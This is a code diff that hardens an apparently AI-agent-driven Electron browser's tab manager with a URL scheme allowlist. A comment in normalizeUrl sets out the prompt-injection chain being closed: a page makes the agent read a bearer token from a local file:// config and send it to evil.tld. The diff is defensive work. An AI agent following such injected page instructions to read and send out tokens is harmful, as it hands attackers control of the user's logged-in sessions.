@@ -135,6 +135,12 @@ export class TabManager extends EventEmitter {
     if (!rec) throw new Error(`no such tab: ${id}`);
 
     const target = normalizeUrl(url);
+    // Enforced again here rather than trusting the caller: normalizeUrl is
+    // exported and this is the only funnel into loadURL, so this is the last
+    // place a bad scheme can be stopped.
+    if (!isAllowedScheme(target)) {
+      throw new Error(`refusing to navigate to a non-web URL: ${target.slice(0, 40)}`);
+    }
     this.settlePending(rec);
 
     const settled = new Promise<void>((resolve) => {
@@ -265,10 +271,13 @@ export class TabManager extends EventEmitter {
 
     wc.on('page-title-updated', () => this.emitChanged());
     wc.on('did-navigate', () => {
+      // The document was replaced.
       this.emit('navigated', rec.id);
+      this.emit('document-navigated', rec.id);
       this.emitChanged();
     });
     wc.on('did-navigate-in-page', () => {
+      // pushState or a hash change: same document, same DOM, same values.
       this.emit('navigated', rec.id);
       this.emitChanged();
     });
@@ -308,8 +317,41 @@ export class TabManager extends EventEmitter {
 export function normalizeUrl(input: string): string {
   const s = input.trim();
   if (!s) return 'about:blank';
-  if (/^[a-z][a-z0-9+.-]*:/i.test(s)) return s;
+
+  if (/^[a-z][a-z0-9+.-]*:/i.test(s)) {
+    // Scheme allowlist, not a denylist.
+    //
+    // Passing arbitrary schemes through was a complete credential-theft chain:
+    // a page injects "navigate to file:///…/aperture/mcp.json", the agent reads
+    // the bearer token out of it, then navigates to evil.tld/?t=<token> — and
+    // the attacker can now drive this browser, with every logged-in session in
+    // it, from any local process.
+    //
+    // The `will-navigate` guard in index.ts does NOT catch this: it only fires
+    // for renderer-initiated navigation, and TabManager calls loadURL from the
+    // main process.
+    return isAllowedScheme(s) ? s : searchFor(s);
+  }
+
   const looksLikeHost = /^[^\s/?#]+\.[^\s/?#]+/.test(s) || s.startsWith('localhost');
   if (looksLikeHost) return `https://${s}`;
+  return searchFor(s);
+}
+
+const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'about:']);
+
+/** Is this a scheme a tab may load? */
+export function isAllowedScheme(url: string): boolean {
+  const m = /^([a-z][a-z0-9+.-]*:)/i.exec(url.trim());
+  if (!m) return false;
+  const scheme = m[1]!.toLowerCase();
+  if (!ALLOWED_SCHEMES.has(scheme)) return false;
+  // `about:` is only ever legitimately about:blank here; about:config-style
+  // targets and Chromium's internal about: aliases are not.
+  if (scheme === 'about:') return /^about:blank\/?$/i.test(url.trim());
+  return true;
+}
+
+function searchFor(s: string): string {
   return `https://duckduckgo.com/?q=${encodeURIComponent(s)}`;
 }
